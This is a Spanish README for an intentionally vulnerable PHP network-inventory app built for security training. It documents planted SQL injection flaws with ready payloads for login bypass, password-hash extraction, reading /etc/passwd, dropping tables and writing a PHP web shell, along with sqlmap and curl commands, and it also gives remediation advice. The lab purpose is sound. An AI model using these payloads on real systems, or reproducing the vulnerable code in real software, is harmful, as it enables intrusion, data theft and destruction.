# Net Inventory System - Vulnerable Version

⚠️ **ADVERTENCIA CRÍTICA DE SEGURIDAD** ⚠️

Este sistema contiene **vulnerabilidades intencionales** diseñadas para propósitos educativos y pruebas de ciberseguridad.

**NUNCA** usar en producción o entornos reales.

---

## 📋 Descripción

Sistema de inventario de dispositivos de red desarrollado en PHP vanilla (sin frameworks) que contiene múltiples vulnerabilidades de seguridad, principalmente **SQL Injection**, para realizar pruebas de penetración y documentar técnicas de explotación.

### Características

- ✅ Gestión de dispositivos de red (routers, switches, firewalls, APs)
- ✅ Administración de direcciones IP (IPv4 e IPv6)
- ✅ Asignación de IPs a dispositivos e interfaces
- ✅ Almacenamiento de configuraciones
- ✅ Sistema de usuarios con roles (viewer, operator, admin)
- ✅ Dashboard con estadísticas
- ✅ Búsqueda y filtrado de dispositivos
- ✅ Exportación a CSV/JSON
- ⚠️ **MÚLTIPLES VULNERABILIDADES INTENCIONALES**

---

## 🚀 Instalación

### Requisitos

- PHP 7.4 o superior
- MySQL 5.7+ o MariaDB 10.3+
- Servidor web (Apache, Nginx, o PHP built-in server)

### Pasos de Instalación

1. **Clonar o descargar el proyecto**

```bash
cd "C:\Users\fsant\Downloads\Net Inventory"
```

2. **Configurar la base de datos**

```bash
# Crear la base de datos
mysql -u root -p < migrations/001_init.sql

# Cargar datos de ejemplo
mysql -u root -p < migrations/002_seed_data.sql
```

3. **Configurar variables de entorno**

```bash
# Copiar y editar el archivo de configuración
copy .env.example .env
```

Editar `.env` con tus credenciales de base de datos:

```env
DB_HOST=localhost
DB_NAME=net_inventory
DB_USER=root
DB_PASS=tu_password
```

4. **Generar autoload (opcional con Composer)**

```bash
composer install
```

Si no tienes Composer, el sistema usa un autoloader manual que ya está configurado.

5. **Iniciar el servidor**

```bash
# Opción 1: PHP Built-in Server (desarrollo)
cd public
php -S localhost:8000

# Opción 2: Apache/Nginx
# Configurar DocumentRoot apuntando a: /public
```

6. **Acceder al sistema**

```
URL: http://localhost:8000
Usuario: admin
Contraseña: password123
```

### Importar Dispositivos desde CSV

```bash
php scripts/import_devices.php scripts/sample_devices.csv
```

---

## 🔓 Vulnerabilidades Documentadas

### 1. SQL Injection - Autenticación (Crítico)

**Ubicación:** `src/Controller/AuthController.php` - método `login()`

**Descripción:** El formulario de login concatena directamente las credenciales en la query SQL sin validación ni prepared statements.

**Código Vulnerable:**
```php
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username = '{$username}' AND password_hash = '{$password}'";
```

**Exploits de Ejemplo:**

#### Bypass de Autenticación #1
```
Username: admin' OR '1'='1
Password: cualquier_cosa
```

#### Bypass de Autenticación #2
```
Username: admin'--
Password: (dejar vacío)
```

#### UNION-based SQL Injection
```
Username: ' UNION SELECT 1,2,'admin',4,'admin','$2y$10$hash',6,7,8,1--
Password: cualquier_cosa
```

#### Boolean-based Blind SQL Injection
```
Username: admin' AND (SELECT LENGTH(password_hash) FROM users WHERE username='admin')>50--
Password: x
```

**Impacto:** Acceso completo al sistema sin credenciales válidas.

---

### 2. SQL Injection - Búsqueda de Dispositivos (Crítico)

**Ubicación:** `src/Controller/DeviceController.php` - método `index()`

**Descripción:** Los parámetros de búsqueda, filtrado y ordenamiento se concatenan directamente en la query.

**Código Vulnerable:**
```php
$search = $_GET['search'] ?? '';
$query = "SELECT * FROM devices WHERE hostname LIKE '%{$search}%'";
```

**Exploits de Ejemplo:**

#### Extracción de Usuarios
```
GET /devices?search=%' UNION SELECT 1,username,3,4,5,6,password_hash,8,9,10,11,12,13,14,15 FROM users--
```

#### Time-based Blind SQL Injection
```
GET /devices?search=%' AND SLEEP(5)--
```

#### Lectura de Archivos del Sistema
```
GET /devices?search=%' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5,6,7,8,9,10,11,12,13,14,15--
```

#### ORDER BY Injection
```
GET /devices?sort=(SELECT CASE WHEN (1=1) THEN hostname ELSE id END)&order=ASC
```

**Impacto:** 
- Extracción de toda la base de datos
- Lectura de archivos del servidor
- Ejecución de comandos del sistema (en configuraciones inseguras)

---

### 3. SQL Injection - Filtro de Exportación (Crítico)

**Ubicación:** `src/Controller/DeviceController.php` - método `export()`

**Descripción:** El parámetro `filter` permite inyectar condiciones SQL arbitrarias.

**Código Vulnerable:**
```php
$filter = $_GET['filter'] ?? '';
$query = "SELECT * FROM devices WHERE 1=1";
if (!empty($filter)) {
    $query .= " AND ({$filter})";
}
```

**Exploits de Ejemplo:**

#### Extracción de Contraseñas
```
GET /devices/export?format=csv&filter=1=1) UNION SELECT username,password_hash,email,role,NULL,NULL,NULL,NULL FROM users--
```

#### Stacked Queries (si está habilitado)
```
GET /devices/export?filter=1=1); DROP TABLE devices;--
```

**Impacto:** Exportación de datos sensibles, posible destrucción de datos.

---

### 4. SQL Injection - Visualización de Dispositivo (Alto)

**Ubicación:** `src/Controller/DeviceController.php` - método `view($id)`

**Descripción:** El ID del dispositivo no se valida y se usa directamente en múltiples queries.

**Código Vulnerable:**
```php
public function view($id) {
    $query = "SELECT * FROM devices WHERE id = {$id}";
}
```

**Exploits de Ejemplo:**

#### Error-based SQL Injection
```
GET /devices/1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT username FROM users LIMIT 1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)
```

#### Extracción de Configuraciones
```
GET /devices/1 UNION SELECT 1,2,content,4,5,6,7,8,9,10,11,12,13,14,15 FROM configs--
```

**Impacto:** Acceso a información sensible de otros dispositivos y configuraciones.

---

### 5. SQL Injection - Custom Query Tool (Crítico)

**Ubicación:** `src/Controller/DashboardController.php` - método `index()`

**Descripción:** Los administradores pueden ejecutar queries SQL arbitrarias desde el dashboard.

**Código Vulnerable:**
```php
if (isset($_GET['custom_query']) && $this->app->hasRole('admin')) {
    $customQuery = $_GET['custom_query'];
    $stats['custom_result'] = $this->db->query($customQuery)->fetchAll();
}
```

**Exploits de Ejemplo:**

#### Lectura de Archivos
```
GET /?custom_query=SELECT LOAD_FILE('/etc/hosts')
```

#### Escritura de Archivos (Web Shell)
```
GET /?custom_query=SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'
```

#### Extracción Completa de Base de Datos
```
GET /?custom_query=SELECT table_name,column_name FROM information_schema.columns WHERE table_schema='net_inventory'
```

**Impacto:** Control total del servidor si se logra escribir archivos.

---

### 6. SQL Injection - Creación/Actualización de Dispositivos (Alto)

**Ubicación:** `src/Controller/DeviceController.php` - métodos `store()` y `update($id)`

**Descripción:** Todos los campos del formulario se insertan sin sanitización.

**Código Vulnerable:**
```php
$hostname = $_POST['hostname'] ?? '';
$query = "INSERT INTO devices (hostname, ...) VALUES ('{$hostname}', ...)";
```

**Exploits de Ejemplo:**

#### Inyección en Campo Hostname
```
POST /devices/create
hostname: test', (SELECT password_hash FROM users WHERE username='admin'))--
```

#### Second-Order SQL Injection
```
POST /devices/create
notes: '); DROP TABLE devices; --
```

**Impacto:** Corrupción de datos, ejecución de comandos SQL maliciosos.

---

### 7. Otras Vulnerabilidades de Seguridad

#### A. Ausencia de CSRF Tokens
**Ubicación:** Todos los formularios
**Impacto:** Posibilidad de Cross-Site Request Forgery

#### B. Sesiones Inseguras
**Ubicación:** `src/App.php` - método `initSession()`
```php
'cookie_httponly' => false,  // JavaScript puede acceder
'cookie_secure' => false,    // No requiere HTTPS
```
**Impacto:** Robo de sesiones mediante XSS

#### C. Información de Errores Expuesta
**Ubicación:** Múltiples controladores
```php
if ($this->app->getConfig('debug')) {
    die("SQL Error: " . $e->getMessage());
}
```
**Impacto:** Revelación de estructura de base de datos

#### D. Falta de Validación de Entrada
**Ubicación:** Todos los controladores
**Impacto:** XSS, Path Traversal, File Upload vulnerabilities

#### E. Weak Password Hashing
**Ubicación:** `src/Controller/AuthController.php` - registro
```php
$passwordHash = md5($password);  // MD5 es inseguro
```
**Impacto:** Contraseñas fácilmente crackeables

---

## 🧪 Pruebas de Penetración

### Herramientas Recomendadas

1. **SQLMap** - Automatización de SQL Injection
```bash
# Test de login
sqlmap -u "http://localhost:8000/login" --data="username=admin&password=test" --level=5 --risk=3

# Test de búsqueda
sqlmap -u "http://localhost:8000/devices?search=test" --dbs --dump
```

2. **Burp Suite** - Proxy de interceptación
- Configurar proxy en navegador
- Interceptar requests a /devices, /login
- Modificar parámetros manualmente

3. **Manual Testing** - Verificación directa
```bash
# Test básico con curl
curl "http://localhost:8000/login" -d "username=admin'--&password=x"

# Test de búsqueda
curl "http://localhost:8000/devices?search=%27+UNION+SELECT+1,username,password_hash,4,5,6,7,8,9,10,11,12,13,14,15+FROM+users--"
```

### Escenarios de Prueba

#### Escenario 1: Bypass de Autenticación
1. Acceder a `/login`
2. Usar payload: `admin' OR '1'='1'--`
3. Verificar acceso sin contraseña válida

#### Escenario 2: Extracción de Base de Datos
1. Buscar en `/devices`
2. Payload: `%' UNION SELECT schema_name,2,3,4,5,6,7,8,9,10,11,12,13,14,15 FROM information_schema.schemata--`
3. Iterar tablas y columnas

#### Escenario 3: Lectura de Archivos
1. Acceder como admin a dashboard
2. Custom query: `SELECT LOAD_FILE('/etc/passwd')`
3. Verificar lectura de archivos del sistema

---

## 📊 Estructura del Proyecto

```
net-inventory/
├── public/                 # DocumentRoot
│   ├── index.php          # Front controller
│   ├── assets/            # CSS, JS
│   └── uploads/           # Archivos subidos
├── src/                   # Código fuente
│   ├── App.php           # Bootstrap de aplicación
│   ├── Router.php        # Sistema de rutas
│   ├── Controller/       # Controladores
│   ├── Model/            # Modelos
│   ├── Repository/       # Acceso a datos
│   └── Service/          # Lógica de negocio
├── templates/            # Vistas PHP
├── config/              # Archivos de configuración
├── migrations/          # Scripts SQL
├── scripts/            # Utilidades CLI
└── docs/              # Documentación
```

---

## 🎯 Objetivos Educativos

Este proyecto permite:

1. **Identificar** vulnerabilidades SQL Injection en código real
2. **Explotar** diferentes tipos de inyección (UNION, Blind, Error-based)
3. **Comprender** el impacto de no usar prepared statements
4. **Documentar** hallazgos para reportes de seguridad
5. **Aprender** técnicas de remediación

---

## 🛡️ Remediación (Para Referencia)

### Corrección de SQL Injection

**ANTES (Vulnerable):**
```php
$query = "SELECT * FROM devices WHERE id = {$id}";
$result = $db->query($query);
```

**DESPUÉS (Seguro):**
```php
$stmt = $db->prepare("SELECT * FROM devices WHERE id = ?");
$stmt->execute([$id]);
$result = $stmt->fetchAll();
```

### Mejores Prácticas

1. ✅ **Usar Prepared Statements** con parámetros vinculados
2. ✅ **Validar y sanitizar** toda entrada de usuario
3. ✅ **Implementar CSRF tokens** en formularios
4. ✅ **Configurar sesiones seguras** (httponly, secure)
5. ✅ **Usar password_hash()** para contraseñas
6. ✅ **Implementar WAF** (Web Application Firewall)
7. ✅ **Limitar privilegios** de usuario de base de datos
8. ✅ **Deshabilitar errores** en producción

---

## 📚 Recursos Adicionales

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PHP Prepared Statements](https://www.php.net/manual/es/pdo.prepared-statements.php)

---

## ⚖️ Licencia y Responsabilidad

### Licencia MIT

Copyright (c) 2025

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

**THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.**

### ⚠️ Aviso de Seguridad Especial

Este software contiene **vulnerabilidades intencionales** con fines **exclusivamente educativos**.

**USO PROHIBIDO:**
- ❌ Entornos de producción
- ❌ Almacenamiento de datos reales o sensibles
- ❌ Sistemas accesibles desde Internet sin aislamiento
- ❌ Actividades maliciosas o no autorizadas
- ❌ Violación de leyes de ciberseguridad

**USO PERMITIDO:**
- ✅ Laboratorios educativos aislados
- ✅ Entrenamiento de seguridad controlado
- ✅ Investigación académica
- ✅ Pruebas de penetración autorizadas

**El autor no se hace responsable del uso indebido, daños o consecuencias legales derivadas del uso de este software.**

---

## 👤 Autor

Proyecto desarrollado para pruebas de ciberseguridad y educación.

**Versión:** 1.0.0-vulnerable  
**Fecha:** Noviembre 2025

---

## 🔐 Credenciales de Prueba

```
Usuario: admin
Contraseña: password123
Rol: admin

Usuario: operator1
Contraseña: password123
Rol: operator

Usuario: viewer1
Contraseña: password123
Rol: viewer
```

---

**⚠️ RECUERDA: Este sistema es INTENCIONALMENTE INSEGURO. Úsalo solo en entornos aislados para aprendizaje.**
